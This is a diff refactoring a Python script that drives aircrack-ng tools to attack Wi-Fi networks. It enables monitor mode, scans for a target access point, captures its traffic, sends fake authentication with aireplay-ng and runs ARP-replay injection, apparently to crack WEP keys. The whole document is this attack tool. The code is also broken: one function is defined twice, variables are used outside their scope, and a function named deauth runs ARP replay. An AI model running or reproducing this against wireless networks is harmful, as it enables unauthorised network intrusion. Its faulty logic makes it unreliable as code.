@@ -1,5 +1,4 @@
-
-def init
+def init(): 
 	os.system("ifconfig wlan0 down")
 	os.system("airmon-ng start wlan0")
 	os.system("airmon-ng start wlan0")
@@ -11,12 +10,12 @@ def init
 	os.system("ifconfig mon0 up")
 	os.system("ifconfig mon1 up")
 
-def authme:
+def fakeauth():
 	os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 
 
-def resume:
+def housekeeping():
 	#back to normal
-	';'.join(("service network-manager start",
+	cmdlist= ';'.join(("service network-manager start",
 		"airmon-ng stop mon4",
 		"airmon-ng stop mon3",
 		"airmon-ng stop mon2",
@@ -24,10 +23,8 @@ def resume:
 		"airmon-ng stop mon0",
 		"airmon-ng stop wlan0"))
 	os.system(cmdlist)
-# -------------------------------------------------
 
-
-def clrpcrap:
+def clrpcrap():
 	os.system("service network-manager stop")
 	os.system("airmon-ng stop mon4")
 	os.system("airmon-ng stop mon3")
@@ -36,7 +33,7 @@ def clrpcrap:
 	os.system("airmon-ng stop mon0")
 	os.system("airmon-ng stop wlan0")
 
-def scan
+def scan():
 	os.system("airodump-ng mon1")
 	bssid = raw_input("bssid: ")
 	essid = raw_input("essid: ")
@@ -45,11 +42,11 @@ def scan
 	station = o.read()[13:30]
 	os.system("xterm -e airodump-ng -c "+c+" --bssid "+bssid+" -w "+essid+" mon1 &")
 
-# fake auth
-cunt = "n"
-while (cunt == "n"):
-	cunt = raw_input("Success(y/n):")
+def fakeauth():
+	cunt = "n"
+	while (cunt == "n"):
+		cunt = raw_input("Success(y/n):")
 
-#de-auth the fake auth
-os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")
+def deauth():
+	os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")
 
